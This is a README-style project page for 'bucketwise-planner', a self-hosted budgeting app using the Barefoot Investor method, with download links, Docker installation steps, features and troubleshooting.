---
layout: "default"
title: "🎉 bucketwise-planner - Simple Budgeting for Everyone"
description: "💰 Simplify budgeting with a multi-user app that follows the Barefoot Investor's method for effective financial planning and debt management."
---
# 🎉 bucketwise-planner - Simple Budgeting for Everyone

## 🚀 Getting Started

Welcome to Bucketwise Planner! This budgeting app helps you manage your money based on the Barefoot Investor method. Whether you're an individual or part of a team, you can take control of your finances. Follow this guide to download and run the app.

## 📥 Download

[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/himamaker/bucketwise-planner/releases)

## 🛠️ Requirements

Before you start, ensure your system meets these requirements:

- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
- **Docker:** Make sure Docker is installed. You can download it from the [Docker website](https://www.docker.com/get-started). 
- **Storage:** At least 500 MB of free disk space.
- **Memory:** 4 GB of RAM is recommended for optimal performance.

## 👨‍🏫 Installation Steps

1. **Visit the Releases Page**

   Go to our [Releases page](https://github.com/himamaker/bucketwise-planner/releases) to find the latest version.

2. **Download the App**

   On the Releases page, look for the latest version. You will see files available for download. Click on the one that suits your operating system. 

3. **Extract the Files (if needed)**

   If you download a zip or tar file, unzip it to a folder where you want to store the application.

4. **Run Docker**

   If you have Docker installed, open your terminal or command prompt and navigate to the folder where you extracted the files.

5. **Start the App with Docker**

   You can start the application by running the following command in your terminal:
   
   ```bash
   docker-compose up
   ```

   This command will pull the necessary components and start the app for you.

6. **Access the App**

   Once it is up and running, you can access Bucketwise Planner by opening your web browser and browsing to [http://localhost:3000](http://localhost:3000).

## 💻 Features

- **Multi-User Support:** Collaborate on budgeting with friends or family members.
- **Fortnightly Budgeting:** Stay on track with your finances every two weeks.
- **Barefoot Investor Methodology:** Use proven financial principles to manage your money.
- **Optional AI Advisor:** Get smarter budgeting advice tailored for you.
- **Self-Hosted using Docker:** Control your data while enjoying easy installation.

## 🖥️ Troubleshooting

If you encounter issues while setting up or running Bucketwise Planner, here are some common problems and solutions:

- **Docker Not Found:** Ensure Docker is properly installed and added to your system's PATH. Restart your computer if needed.
- **Port Already in Use:** If you receive an error indicating that port 3000 is busy, you can stop the service using the command:
   
   ```bash
   docker-compose down
   ```

   Make sure no other services are using the same port before starting Bucketwise Planner again.

- **Browser Issues:** If you cannot access the app, try refreshing the page or using a different web browser.

## 📞 Support

For further questions or issues, please raise an issue on our [GitHub Issues page](https://github.com/himamaker/bucketwise-planner/issues). We appreciate your feedback and aim to improve the app.

## 📝 Contributions

We welcome contributions! If you’d like to help, check our [contributing guidelines](https://github.com/himamaker/bucketwise-planner/CONTRIBUTING.md). Your contributions can make this app even better.

## 🤝 Acknowledgments

Thanks to everyone who contributed to Bucketwise Planner. Your support helps make financial planning easier for everyone. 

For more details about our project, check out our [Releases page](https://github.com/himamaker/bucketwise-planner/releases).